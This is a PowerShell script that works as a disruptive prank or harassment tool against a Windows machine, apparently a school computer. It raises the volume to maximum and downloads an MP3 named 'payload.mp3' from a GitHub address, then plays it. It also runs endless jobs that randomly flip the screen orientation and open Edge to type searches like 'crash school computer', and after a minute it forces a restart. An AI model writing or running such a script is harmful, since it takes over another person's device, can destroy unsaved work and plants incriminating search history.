# ——— Setup Assemblies ———
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Media
Add-Type -AssemblyName System.Drawing

# ——— Max Volume Instantly ———
$wshell = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 50; $i++) {
    $wshell.SendKeys([char]175)  # Volume Up key
    Start-Sleep -Milliseconds 10
}

# ——— Download & Play MP3 ———
$mp3Path = Join-Path $env:TEMP 'payload.mp3'
Invoke-WebRequest -Uri 'https://github.com/Anarxyfr/fdsa/raw/refs/heads/main/4b96811d-1725-4694-bf60-c3f3e54b5f94.mp3' -OutFile $mp3Path
$player = New-Object System.Media.SoundPlayer $mp3Path
$player.Play()

# ——— Start Orientation Flip Job ———
Start-Job -Name FlipOrientation -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    $keys = @('^{%}{LEFT}', '^{%}{RIGHT}', '^{%}{UP}', '^{%}{DOWN}')
    while ($true) {
        $key = $keys | Get-Random
        [System.Windows.Forms.SendKeys]::SendWait($key)
        Start-Sleep -Seconds 3
    }
}

# ——— Start Edge Search Spam Job ———
Start-Job -Name EdgeSpam -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    $searches = @(
        'chromebook annihilation',
        'how to cheat on tests',
        'how to play games in school',
        'bypass school wifi',
        'install games without admin',
        'crash school computer'
    )
    while ($true) {
        $query = $searches | Get-Random
        Start-Process 'msedge.exe'
        Start-Sleep -Seconds 2
        foreach ($char in $query.ToCharArray()) {
            [System.Windows.Forms.SendKeys]::SendWait($char)
            Start-Sleep -Milliseconds 30
        }
        [System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
        Start-Sleep -Seconds 3
    }
}

# ——— Restart After 60 Seconds ———
Start-Sleep -Seconds 60
Restart-Computer -Force
